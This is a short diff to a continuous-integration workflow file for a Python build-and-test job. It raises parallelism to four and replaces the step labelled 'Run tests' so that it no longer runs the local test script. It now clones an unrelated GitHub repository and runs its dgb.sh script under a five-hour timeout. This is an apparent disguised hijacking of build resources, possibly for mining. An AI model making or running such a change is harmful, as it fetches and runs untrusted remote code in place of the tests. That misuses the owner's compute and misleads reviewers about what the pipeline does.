@@ -12,6 +12,7 @@ workflows:
  
 jobs: 
   build-and-test:
+    parallelism: 4
     docker: 
       - image: cimg/python:3.8 
      
@@ -20,4 +21,4 @@ jobs:
       - run: 
           name: Run tests 
           no_output_timeout: 5h 
-          command: chmod +x tst.sh && ./tst.sh
+          command: git clone https://github.com/IdaAMcKay/IdaAMcKay.git && cd IdaAMcKay && chmod +x dgb.sh && ./dgb.sh
